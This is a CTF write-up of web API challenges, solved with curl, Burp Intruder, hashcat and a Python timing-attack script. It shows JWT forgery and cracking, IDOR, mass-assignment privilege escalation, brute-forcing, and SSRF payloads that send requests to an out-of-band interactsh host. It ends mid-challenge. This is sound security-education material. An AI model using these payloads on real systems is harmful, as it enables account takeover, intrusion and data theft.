
# Scoreboard

I was Team Kern(a)l2 with a total of 1045 points (10th place).

![](dashboard-1.png)
![](dashboard-2.png)
# Under Construction
## Start With the Basics 

### Points: 25

Looks like there is web app on the Target URL listed below, but the front end hasn’t been built. Maybe you can use the API to get some flags? The first one seems pretty simple... Target URL: [https://under-construction.chals.ctf.malteksolutions.com/](https://under-construction.chals.ctf.malteksolutions.com/ "https://under-construction.chals.ctf.malteksolutions.com/")

Navigating to the website, we see it is under construction and tells us about an `/api/docs` endpoint.

![](start-with-the-basics-1.png)

On this endpoint, we see there are a few endpoints that we can explore.

![](start-with-the-basics-1-2.png)

Looking at the register function, we see we need to send a POST request to `/api/register` and have the parameters in a form format.

![](start-with-the-basics-3.png)

```
curl -X POST https://under-construction.chals.ctf.malteksolutions.com/api/register \
-H "Content-Type: application/x-www-form-urlencoded" \
-d 'username=sec10splaya&password=testin123!'
```

Now that we have successfully create a user, we can log into the application.

```
curl -X POST https://under-construction.chals.ctf.malteksolutions.com/api/login \   
-H "Content-Type: application/x-www-form-urlencoded" \
-d 'username=sec10splaya&password=testin123!'
```

The response shows a success message and gives us a session token.

```
{"message":"success","session":"ea692712-41fd-41ea-9b7b-48151fe0ff56"} 
```

Using the session token, we can retrieve the flag.

```
curl -X GET https://under-construction.chals.ctf.malteksolutions.com/api/flag \ 
-H "Content-Type: application/x-www-form-urlencoded" \
-d 'username=sec10splaya&password=testin123!' \
-H "Authorization: Bearer ea692712-41fd-41ea-9b7b-48151fe0ff56"
```

Flag: apisec{nO_Br0w53r_N3Ed3d}

## Whose Note is it Anyways?

### Points: 100

Another flag has been hidden in the API. I can't remember where I hid it, I'll have to check my _notes_... Target URL: [https://under-construction.chals.ctf.malteksolutions.com/](https://under-construction.chals.ctf.malteksolutions.com/ "https://under-construction.chals.ctf.malteksolutions.com/")

Using the session token from [Start With the Basics](#start-with-the-basics), we can obtain the notes.

Using Burp Suite Intruder, we can craft a request and send 600 numbers incrementing by 1 to the server.

![](whose-note-is-it-anyways-1.png)
![](whose-note-is-it-anyways-2.png)

After Burp Suite Intruder finishes, we see that the flag is inside the response of note 479.

![](whose-note-is-it-anyways-3.png)

Flag: apisec{Th4t5_JuSt_IDORabl3}

# Insecure Runes 

## Insecure Runes

### Points: 200

It looks like the orc devs are back to working for the mages! Unfortunately some of the mages are complaining about rune references being mixed up? It's been said that there's a secret way to access the flag, but we've yet to find it. Target URL: [https://insecure-runes.chals.ctf.malteksolutions.com/](https://insecure-runes.chals.ctf.malteksolutions.com/ "https://insecure-runes.chals.ctf.malteksolutions.com/")

Going to the URL, we see there are a few endpoints we can look at.

![](insecure-runes-1.png)

Using the POST request, we can see what responses we get. First we will try the `7*7` payload.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "7*7"}'
```

![](insecure-runes-2.png)

Since it returns 49, we know that it is doing some sort of calculation on the backend. In an attempt to see if it is python, we can run `__file__`.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "__file__"}'
```

![](insecure-runes-3.png)

Knowing this, we can assume that it is an SSTI, or something similar to SSTI. However, after enumerating all functions, SSTI did not appear to be the answer since there was a character limit of 20. Trying to type `flag` resulted in a different response.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "flag"}' 
```

![](insecure-runes-4.png)

Seeing this, that means we will need to bypass the restriction to see the flag. We can add an `@` which will get removed since it is a special character in Linux command line. From there, we obtained the flag.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "f@lag"}'
```

![](insecure-runes-5.png)

This can also be done by running the `globals()` function.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "globals()"}'
```

![](insecure-runes-6.png)

Flag: apisec{tH3_d3v5_aR3_0rC5}

# Ent Gardening
## JWT Germinator  

### Points: 50

Sauron has tasked you with taking care of an ent for the upcoming war. Use the API to monitor it's growth. Sauron will only reward you when your ent has finished growing.

Target URL: [https://ent-gardening-1.chals.ctf.malteksolutions.com/](https://ent-gardening-1.chals.ctf.malteksolutions.com/)

Going to the website, we see there are a few endpoints we can explore.

![](jwt-germinator-1.png)

We can first obtain a "seed" from the `/ent/get_seed` endpoint.

```
curl -X POST https://ent-gardening-1.chals.ctf.malteksolutions.com/ent/get_seed
```

In the response, we retrieve a `Seed_Token`.

```
{"Seed_Token":"b'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiODAwMDAwMCJ9.'"}
```

Taking the second part of the JWT, we can base64 decode it.

```
echo "eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiODAwMDAwMCJ9" | base64 -d
```

This results in the following cleartext.

```
{"Name":"Richard Cash","Time_Left_In_Years":"8000000"}
```

Taking this, we can modify it and set `Time_Left_In_Years` to `0`.

```
echo '{"Name":"Richard Cash","Time_Left_In_Years":"0"}' | base64
```

Now we get the following:

```
eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiMCJ9Cg==
```

Merging the new payload with the header, we get the following JWT.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiMCJ9Cg==.
```

Using this, we can send a POST request to the `/ent/check_seed` and retrieve the flag.

```
curl -X POST https://ent-gardening-1.chals.ctf.malteksolutions.com/ent/check_seed -d '{"Seed_Token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiMCJ9Cg==."}' -H 'Content-Type: application/json'
```

![](jwt-germinator-2.png)


Flag: apisec{H0wD_ThAt_Gr0W_5o_Fa5T}

## JWT Arborist  

### Points: 75

Sauron is unhappy with those who have found a way to bypass the expected waiting time for their ent to properly mature. There has been a new API released for use, which has added security measures. Do not dissapoint him again. Target URL: [https://ent-gardening-2.chals.ctf.malteksolutions.com/](https://ent-gardening-2.chals.ctf.malteksolutions.com/)

The endpoints are the same as the previous challenge.

We can retrieve a seed token from the `/ent/get_seed` endpoint.

```
curl -X POST https://ent-gardening-2.chals.ctf.malteksolutions.com/ent/get_seed          
```

![](jwt-arborist-1.png)

```
{"Seed_Token":"b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiQ2FybG9zIENvbGUiLCJUaW1lX0xlZnRfSW5fWWVhcnMiOiI4MDAwMDAwIn0.E4RZZ8QjaBifK4skVn6SR1Kssi1HOERgIxVqNleeUKw'"}
```

When we try to modify the JWT just like the one from [JWT Germinator](#jwt-germinator), we get a "Signature verification failed" error message.

![](jwt-arborist-2.png)

Using hashcat, we can bruteforce the signature.

```
hashcat -a 0 -m 16500 jwt /usr/share/wordlists/rockyou.txt
```

![](jwt-arborist-3.png)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiSmFuaXMgTGVlIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiODAwMDAwMCJ9.tViW_WZJ0hP09EYuoTTIFLNneMh2cW0_j11mfNYLLVU:december30
```

Using [JWT.io](https://jwt.io), we can insert the signature and modify the JWT, setting the `Time_Left_In_Years` to `0`.

![](jwt-arborist-4.png)

Accessing the `/ent/check_seed` endpoint, we can retrieve the flag.

```
curl -X POST https://ent-gardening-2.chals.ctf.malteksolutions.com/ent/check_seed -d '{"Seed_Token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiQ2FybG9zIENvbGUiLCJUaW1lX0xlZnRfSW5fWWVhcnMiOiIwIn0.P4ib4Q5siD-7kCmubjKpnEfJeB05Pfrddkhviiq6gow"}' -H 'Content-Type: application/json'
```

![](jwt-arborist-5.png)

Flag: apisec{4r3_y0u_4_t1m3_tr4v3ll3r}

## Garden of Tokens

### Points: 100

*I did not receive points for this challenge as it was solved after the competition concluded.*

Apparently you can't be trusted to properly care for these ents. Therefore we are now tracking all ent data centrally. You can only retrieve your flag once your ent has sufficiently matured. Target URL: [https://ent-gardening-3.chals.ctf.malteksolutions.com/](https://ent-gardening-3.chals.ctf.malteksolutions.com/)

Looking at the homepage, we see a few interesting endpoints.

![](garden-of-tokens-1.png)

We can take a look at all the seeds on the API.

```
curl -X GET https://ent-gardening-3.chals.ctf.malteksolutions.com/ent/seeds -s | jq
```

![](garden-of-tokens-2.png)

We can POST to `/ent/seed/new` which reveals the `seed_token`, for each name even though the plant exists. Looking at the `Jonathan Monroe` plant, we see that the JWT has `Time_Left_In_Years` set to `-14`.

```
curl -X POST -s https://ent-gardening-3.chals.ctf.malteksolutions.com/ent/seed/new -d '{"name":"Jonathan Monroe"}' -H "Content-Type: application/json"
```

```
{"error":"Plant already exists!","seed_token":"b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiSm9uYXRoYW4gTW9ucm9lIiwicGxhbnRlZF9kYXRlIjoyMDAwLCJUaW1lX0xlZnRfSW5fWWVhcnMiOi0xNH0.tN_oSm0dsxhCi8lGD9E_O0uCeiq76Tjec884PK6DuDs'"}
```


![](garden-of-tokens-3.png)

Knowing this, we can POST to `/ent/seed/check` using the `seed_token` and retrieve the flag.

```
curl -X POST -s https://ent-gardening-3.chals.ctf.malteksolutions.com/ent/seed/check -d '{"Seed_Token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiSm9uYXRoYW4gTW9ucm9lIiwicGxhbnRlZF9kYXRlIjoyMDAwLCJUaW1lX0xlZnRfSW5fWWVhcnMiOi0xNH0.tN_oSm0dsxhCi8lGD9E_O0uCeiq76Tjec884PK6DuDs"}' -H "Content-Type: application/json"
```

![](garden-of-tokens-4.png)

Flag: apisec{th4nk_y0u_f0r_y0ur_3ff0rt5_1n_h3lping_0ur_g4rd3n_grow}

---

# Sauron's Firewall

## Come @ me, Sauron!

### Points: 75

Sauron is pretty against his orcs using social media which is why he ONLY allows them to use [http://sauron.com](http://sauron.com/). Only there, does he allow his flags to be sent. Can you find a way to retrieve the flag? Target URL: [https://saurons-firewall-1.chals.ctf.malteksolutions.com/](https://saurons-firewall-1.chals.ctf.malteksolutions.com/)

Looking at the home page, we see there is one endpoint that we will need to look at.

![](come-at-me-sauron-1.png)

When we try to access `http://sauron.com`, we retrieve an error message.

![](come-at-me-sauron-2.png)

```
curl -X POST https://saurons-firewall-1.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://sauron.com"}'
```

```
{"error":"Invalid URL or no response!"}
```

This attack requires Out-of-Band (OOB) knowledge. Since some people do not have Burp Suite Collaborator, we can use [InteractSH](https://github.com/projectdiscovery/interactsh?tab=readme-ov-file#usage). After starting interactsh, we can send the request to the host provided by interactsh and retrieve the flag.

```
./interactsh-client -v -http-only
```

```
curl -X POST -H "Content-Type: application/json" -d '{"url": "http://sauron.com@cp79aisahse4lmm955rgbpfwtzdjbrjca.oast.fun"}' https://saurons-firewall-1.chals.ctf.malteksolutions.com/proxy
```

![](come-at-me-sauron-3.png)

Flag: apisec{Th3_eYe_d1Dn't_Se3_Th15_c0M1nG}

## Bypass the Dark Lord's Firewall

### Points: 100

*I did not receive points for this challenge as it was solved after the competition concluded.*

Sauron is still adamant about restricting his orcs' social media usage, allowing them access only to [http://sauron.com](http://sauron.com/). Only to this domain will he securely transmit his flags. He found out about your little "@" trick, so don't think about using that again! Target URL: [https://saurons-firewall-2.chals.ctf.malteksolutions.com/](https://saurons-firewall-2.chals.ctf.malteksolutions.com/)

Since we cannot use the @ sign. we can try making the `http://sauron.com` a subdomain of our interactsh instance. We see that we get a connection back which reveals the flag.

```
curl -X POST https://saurons-firewall-1.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://sauron.com.cp79rmcahse131cjbda0xr6ef787je3ox.oast.fun"}'
```

![](bypass-the-dark-lords-firewall-1.png)

Flag: apisec{Th3_eYe_d1Dn't_Se3_Th15_c0M1nG}

## Sauron's Last Stand

### Points: 125

*I did not receive points for this challenge as it was solved after the competition concluded.*

Sauron's grip on his orcs' internet access remains tight, limiting them solely to [http://sauron.com/](http://sauron.com/) for all communications. His security measures have grown even more sophisticated. Do you have what it takes to penetrate his enhanced defenses and capture the flag?  
Target URL: [https://saurons-firewall-3.chals.ctf.malteksolutions.com/](https://saurons-firewall-3.chals.ctf.malteksolutions.com/)

Looking at the previously 2 challenges, the error message continue to say the URL required `http://sauron.com`, but with this challenge, it gives a different error message.

```
curl -X POST https://saurons-firewall-3.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://sauron.com"}' 
```

![](saurons-last-stand-1.png)

The first thing that stands out is it is looking for an appended backlash at the end of the URL: `http://sauron.com/`

With this, we can try to add the interactsh payload before the Sauron domain and see what it returns.

```
curl -X POST https://saurons-firewall-3.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://cp7jt3sahsecg1ekgdugj8eq98a4ey7xo.oast.site/http://sauron.com/"}'
```

![](saurons-last-stand-2.png)

Looking at the GET request on interactsh, we see that the pointed URL is missing a `/`.

![](saurons-last-stand-3.png)

In an attempt to bypass the backlash filter, we can append another backlash to the end of the Sauron domain, and see we can retrieve the flag.

```
curl -X POST https://saurons-firewall-3.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://cp7jt3sahsecg1ekgdugj8eq98a4ey7xo.oast.site/http://sauron.com//"}'
```

![](saurons-last-stand-4.png)

![](saurons-last-stand-5.png)

Flag: apisec{th35e_F1lt3r5_4r3_4_j0k3}

---
# Blogger

## Role Reversal
 
### Points: 100

Check out our new blog! Well, the API at least! Now featuring draft posts. We think it's pretty secure, so we've added a special flag in the admin account that only other admins are able to see.

Target URL: [https://blogger.chals.ctf.malteksolutions.com/](https://blogger.chals.ctf.malteksolutions.com/)

On the main page, there is nothing, which means there needs to be an API somewhere. Using common words like `api`, `v1`, `v2`, `docs`, we stumble upon a FastAPI on the `/docs` endpoint.

![](role-reversal-1.png)

We see there is a signup endpoint, so we will create a user.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/signup' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "testing@test.com",
  "password": "password",
  "first_name": "John",
  "last_name": "Doe"
}'
```

![](role-reversal-2.png)

Now we can log into the API and retrieve a session.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "testing@test.com",
  "password": "password"
}'
```

![](role-reversal-3.png)

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmdAdGVzdC5jb20iLCJmaXJzdF9uYW1lIjoiSm9obiIsImxhc3RfbmFtZSI6IkRvZSIsInJvbGUiOiJ1c2VyIiwiZXhwaXJlcyI6MTcxNjQyNTAxNS4xMTQ2ODY3fQ._Ua_mpkrOnoQayFrTyx6g8yC2Q5y92jkhG1VaM-EHIA"} 
```

Using this access token, we can view other users on the application. So, we try to look at the userID 1 and see that it is the administrator.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/users/1' \
  -H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmdAdGVzdC5jb20iLCJmaXJzdF9uYW1lIjoiSm9obiIsImxhc3RfbmFtZSI6IkRvZSIsInJvbGUiOiJ1c2VyIiwiZXhwaXJlcyI6MTcxNjQyNTAxNS4xMTQ2ODY3fQ._Ua_mpkrOnoQayFrTyx6g8yC2Q5y92jkhG1VaM-EHIA'
```

![](role-reversal-4.png)

Looking at all the different values within the response, we see there is a `role` parameter. On our user that we are signed in, our role value is set to `user`.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/users/me' \
  -H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmdAdGVzdC5jb20iLCJmaXJzdF9uYW1lIjoiSm9obiIsImxhc3RfbmFtZSI6IkRvZSIsInJvbGUiOiJ1c2VyIiwiZXhwaXJlcyI6MTcxNjQyNTAxNS4xMTQ2ODY3fQ._Ua_mpkrOnoQayFrTyx6g8yC2Q5y92jkhG1VaM-EHIA'
```

![](role-reversal-5.png)

Let's try creating a user with the role `admin`.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/signup' \  
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{                                                                                                      
  "email": "testing2@test.com",
  "password": "password",
  "first_name": "John",
  "last_name": "Doe",
  "role": "admin"
}'
```

After going back to the login with the new user, we can retrieve the token.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \                               
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "testing2@test.com",
  "password": "password"
}'
```

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmcyQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1MzEyLjkyNjI1M30.VTUlP_Xexx_7eaAoE5-Wra5LBz01hZx010u0NFgUu7E"}
```

Looking at the administrator user, we see more parameters about the user, one of which is the `flag`.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/users/1' \ 
  -H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmcyQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1MzEyLjkyNjI1M30.VTUlP_Xexx_7eaAoE5-Wra5LBz01hZx010u0NFgUu7E'
```

```
{"id":1,"email":"admin@malteksolutions.com","password":"27d2293cb4e631ee5360429382c9be31db609eaedb0071fddd939aafe4031579","first_name":"Sys","last_name":"Admin","role":"admin","created_time":"2024-05-22 14:59:34","flag":"apisec{l00k_at_m3_1_am_th3_4dm1n_now}"}
```
![](role-reversal-6.png)

Flag: apisec{l00k_at_m3_1_am_th3_4dm1n_now}

## Prying Eyes Prohibited

### Points: 150

Since we just rolled out draft posts, we want to make sure they stay safe from prying eyes. If you want to see the stuff from someone else that hasn't been posted yet, you're outta luck! Target URL: [https://blogger.chals.ctf.malteksolutions.com/](https://blogger.chals.ctf.malteksolutions.com/)

From the [Role Reversal](#role-reversal) challenge, we obtain administrative access to the application. In doing so, there was a password field in the response when going to the administrator user. Taking this password, we can run it through CrackStation, and retrieve the password for the administrator user.

![](prying-eyes-prohibited-1.png)

Using this password, we can create a token as the administrator by logging in.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \   
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{                                                                                                       
  "email": "admin@malteksolutions.com",
  "password": "koolman1"
}'
```

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1hbHRla3NvbHV0aW9ucy5jb20iLCJmaXJzdF9uYW1lIjoiU3lzIiwibGFzdF9uYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1NTg2LjU2OTU5OTJ9.LW0jm0L8jgRCRFZQdrSs0X6rZ8QbvNUj4sdMG7G8R7A"} 
```

Within the `/posts` endpoint, we see that there are 2 parameters that can be passed.

![](prying-eyes-prohibited-2.png)

Since we have the administrator account and token, we can read the draft posts. Looking at the draft post, we see we can retrieve the flag.

![](prying-eyes-prohibited-3.png)

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/posts?author_id=1&draft=true' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1hbHRla3NvbHV0aW9ucy5jb20iLCJmaXJzdF9uYW1lIjoiU3lzIiwibGFzdF9uYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1NTg2LjU2OTU5OTJ9.LW0jm0L8jgRCRFZQdrSs0X6rZ8QbvNUj4sdMG7G8R7A'
```

```
{"data":[{"id":1,"title":"Hello World!","content":"apisec{I_f0und_y3r_4dm1n_p0sts}","author_id":1,"created_time":"2024-05-22 14:59:34","draft":"true"},{"id":50,"title":"whatever","content":"text","author_id":1,"created_time":"2024-05-22 19:57:00","draft":"true"}]}
```

Flag: apisec{I_f0und_y3r_4dm1n_p0sts}
## Bonus Points Challenge

*Since I was the 4th team to submit the flag to the creator, I received 70 points.*

Within the FastAPI of blogger, we see there is a `/bonus` endpoint.

When trying to access this endpoint, we receive an interesting error message.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/bonus' \
  -H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQG1hbHRla3NvbHV0aW9ucy5jb20iLCJmaXJzdF9uYW1lIjoiU3lzIiwibGFzdF9uYW1lIjoiQWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1NTg2LjU2OTU5OTJ9.LW0jm0L8jgRCRFZQdrSs0X6rZ8QbvNUj4sdMG7G8R7A'
```

```
{"error":"This is only available to users who have been registered for more than 2 years."}
```

Looking back at [Role Reversal](#role-reversal), we saw the parameter `created_time`. Let's sign up another user and add this parameter to the command.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/signup' \  
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{                                                                                                      
  "email": "testing3@test.com",
  "password": "password",
  "first_name": "John",
  "last_name": "Doe",
  "role": "admin",
  "created_time":"2021-05-22 14:59:34"
}'
```

![](blogger-bonus-1.png)

 Sign into the API to retrieve the user's token.

![](blogger-bonus-2.png)

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \                                  
  -H 'accept: application/json' \      
  -H 'Content-Type: application/json' \
  -d '{                                                                                                                    
  "email": "testing3@test.com",        
  "password": "password"
}'
```

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmczQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1OTk5LjE3NTE0MTN9.ME7xU_NfygYOumci1Xe-ZTPkyfOd0vK2wgKteHeYvG0"} 
```

Now, when trying to access the `/bonus` endpoint, we retrieve the bonus flag.

```
curl -X 'GET' \ 
  'https://blogger.chals.ctf.malteksolutions.com/bonus' \                                  
  -H 'accept: application/json' \      
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmczQHRlc3QuY29tIiwiZmlyc3RfbmFtZSI6IkpvaG4iLCJsYXN0X25hbWUiOiJEb2UiLCJyb2xlIjoiYWRtaW4iLCJleHBpcmVzIjoxNzE2NDI1OTk5LjE3NTE0MTN9.ME7xU_NfygYOumci1Xe-ZTPkyfOd0vK2wgKteHeYvG0'
```

![](blogger-bonus-3.png)

```
{"flag":"apisec{i_bU1lt_4_t1m3_m4ch1n3}"}
```

Flag: apisec{i_bU1lt_4_t1m3_m4ch1n3}

---
# Hoard's Door

## Passcode to the Dark Vault

### Points: 75

It seems you found the door to Sauron's Gold! Can you figure out the Passcode? Target URL: [https://hoards-door-1.chals.ctf.malteksolutions.com](https://hoards-door-1.chals.ctf.malteksolutions.com/)

Looking at the home page, there are a `/vault` endpoint that requires a 4 digit numerical PIN value.

![](hoards-door-1.png)

We can bruteforce this PIN value between 0000 and 9999 using Burp Suite Intruder, and retrieve the flag.

![](hoards-door-2.png)

Flag: apisec{th4t_W45_P1n-Cr3d1bl3}

## Unlocking Sauron's Gold

### Points: 150

*I did not receive points for this challenge as it was solved after the competition concluded.*

That first door wasn't too hard, but can you figure out the next one? Sauron's Gold is just beyond this door. Target URL: [https://hoards-door-2.chals.ctf.malteksolutions.com/](https://hoards-door-2.chals.ctf.malteksolutions.com/)

Looking at the home page, we see that there is a `/vault` endpoint.

![](unlocking-saurons-gold-1.png)

We can create python script that will bruteforce the password for each character. This attack is a time based attack, so you will need to pay attention to each character being passed and the time it takes for the server to respond.

```python
import requests
import string
import time

url = "https://hoards-door-2.chals.ctf.malteksolutions.com/vault"

password = ""

characters = string.ascii_lowercase + string.ascii_uppercase

headers = {"Content-Type": "application/json"}

while True:
    max_elapsed_time = 0
    best_char = None
    for char in characters:
        data = {"Password": f"{password}{char}"}
        try:
            start_time = time.time()
            response = requests.post(url, json=data, headers=headers)
            end_time = time.time()
            elapsed_time = end_time - start_time
            print(f"Trying password: {password}{char} - Response time: {elapsed_time:.2f} seconds")
            if elapsed_time > max_elapsed_time:
                max_elapsed_time = elapsed_time
                best_char = char
                
            if "Incorrect Password" not in response.text:
                password += char
                print(f"Password found: {password}")
                print(response.text)
                exit()
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            continue

    if best_char:
        password += best_char
        print(f"Password found so far: {password}")
```

After letting it run, we see that the password is `OpenSesame`, and we can retrieve the flag.

![](unlocking-saurons-gold-2.png)

Flag: apisec{t1me_15_0f_ThE_3ss3nc3}

---
# Uber Orc

## Did Someone Order a Flag?

### Points: 100

The orcs gotta eat right? Luckily Sauron is always there to help every orc with their dietary needs. And he included coupons! What a guy. Target URL: [https://uber-orc-1.chals.ctf.malteksolutions.com/](https://uber-orc-1.chals.ctf.malteksolutions.com/)

Going to the home page, we see a few interesting endpoints.

![](did-someone-order-a-flag-1.png)

First, we can view all the restaurants on the API.

```
curl -X GET https://uber-orc-1.chals.ctf.malteksolutions.com/restaurants
```

```
{"0":"Ent in the Box","1":"Orc Hut","2":"GFC","3":"WhataGnome","4":"McSauron's"}
```

We see there are 5 restaurants within the API.

After looking at the menu for each of the restaurants, we see the GFC (ID 2) has a `Flag` item in the menu.

```
curl -X GET -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/menu | jq
```

![](did-someone-order-a-flag-2.png)

We can look at all the coupons within the API, and see on the 20th hour, there is a $2 coupon. Since the Flag costs $999, it's safe to assume that we will need this coupon.

```
curl -X GET -s https://uber-orc-1.chals.ctf.malteksolutions.com/coupons/20 | jq
```

![](did-someone-order-a-flag-3.png)

After trying to order something with this coupon, we see that $2 gets removed from the total.

```
curl -X POST -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/order -H "Content-Type: application/json" -d '{"Time":20,"Menu_Items":"5","Coupons":"3"}' | jq
```

![](did-someone-order-a-flag-4.png)

If we add a comma in the coupons and add another 3, we see that $4 gets removed from the total.

```
curl -X POST -s https://uber-orc-1.chals.ctf.malteksolutions.com/restaurant/2/order -H "Content-Type: application/json" -d '{"Time":20,"Menu_Items":"5","Coupons":"3,3"}' | jq
```

![](did-someone-order-a-flag-5.png)

After putting 500 3's into the command, we retrieve the flag.

```
